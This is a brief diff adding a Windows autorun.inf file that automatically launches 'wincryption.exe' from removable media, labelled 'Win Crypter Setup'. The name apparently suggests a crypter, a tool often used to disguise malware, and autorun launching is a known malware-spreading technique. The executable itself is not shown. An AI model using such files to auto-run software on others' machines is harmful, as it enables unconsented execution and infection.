@@ -1,0 +1,4 @@
+[autorun] 
+open=wincryption.exe
+icon=autorun.ico
+label=Win Crypter Setup
